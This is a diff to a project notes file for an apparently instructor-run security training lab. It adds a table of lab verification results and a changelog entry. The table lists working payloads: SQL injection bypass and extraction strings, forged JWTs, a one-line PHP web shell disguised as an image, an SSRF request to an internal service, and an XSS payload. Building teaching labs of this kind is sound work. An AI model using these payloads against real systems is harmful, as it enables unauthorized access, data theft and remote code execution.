@@ -137,6 +137,29 @@ Updated to match teaching materials (SQLblind.pdf, SQLerrorbased.pdf):
 | SSRF | /api/ | ✅ Working | Internal service access |
 | XSS | /search/ | ✅ Working | Reflected XSS via img onerror |
 
+### 11. Lab Verification Test Results (2026-03-07)
+
+Full end-to-end testing performed from Windows client (10.10.61.221) and server localhost:
+
+| Lab | Test Method | Payload/Command | Result |
+|-----|-------------|-----------------|--------|
+| **SSH Key Auth** | PowerShell Test-NetConnection | Port 2222 | ✅ TcpTestSucceeded: True |
+| **SQL Login Bypass** | curl POST | `username=admin'-- -&password=x` | ✅ Redirects to dashboard |
+| **SQL UNION** | curl GET | `id=1 UNION SELECT 1,flag,3,4 FROM secret_data-- -` | ✅ Extracts flag |
+| **SQL Error-based** | curl GET | `bookID=1 AND extractvalue(1,concat(0x7e,(SELECT flag FROM secret_data)))` | ✅ Error reveals data |
+| **SQL Blind** | curl GET | `code=LOC001' AND SUBSTRING((SELECT flag FROM secret_data),1,1)='F'-- -` | ✅ Valid response |
+| **JWT None Algorithm** | Forged token | `{"alg":"none"}`, `{"role":"administrator"}` | ✅ Admin access granted |
+| **JWT Weak Key** | Forged token | Signed with `secret1`, role=administrator | ✅ Flag: JWT_WEAK_KEY_CRACKED_2026 |
+| **File Upload** | Polyglot JPEG+PHP | `GIF89a<?php system($_GET['cmd']);?>` | ✅ RCE achieved |
+| **CSRF** | curl POST | No CSRF token required | ✅ Transfer succeeds |
+| **SSRF** | curl POST JSON | `{"url":"http://127.0.0.1:7070/internal/config"}` | ✅ Internal config leaked |
+| **XSS** | Browser GET | `<img src=x onerror=alert(1)>` | ✅ Alert executed |
+
+**Test Environment:**
+- Server: Ubuntu 22.04, Docker containers running
+- Client: Windows 10/11 via Tailscale subnet (10.10.61.221)
+- All 9 containers verified running before tests
+
 ---
 
 ## GitHub Repository & Deployment
@@ -464,6 +487,7 @@ If you need to contact the instructor or have questions about the project purpos
 
 | Date | Changes |
 |------|---------|
+| 2026-03-07 | **Comprehensive lab verification:** Tested all 11 labs from Windows client (10.10.61.221) with documented payloads - all passed |
 | 2026-03-07 | **Fixed CSRF bank routing:** Changed form actions and Flask redirects to use relative paths; added nginx trailing slash redirects for `/share`, `/profile`, `/api`, `/evil`, `/search` |
 | 2026-03-07 | **Updated SSH lab hint.txt:** Now contains Google Docs link instead of inline hints; updated walkthrough-ssh-lab.md accordingly |
 | 2026-03-07 | **Created lab reset scripts:** reset-labs.sh, reset-direct.bat, reset-remote.bat/sh for pre-class setup |
@@ -504,5 +528,5 @@ If you need to contact the instructor or have questions about the project purpos
 
 ---
 
-*Last Updated: 2026-03-07 (Fixed CSRF bank routing, updated SSH hint.txt to Google Docs link)*
+*Last Updated: 2026-03-07 (Comprehensive lab verification from Windows client - all 11 labs passed)*
 *This file helps Claude understand the project context in new sessions.*
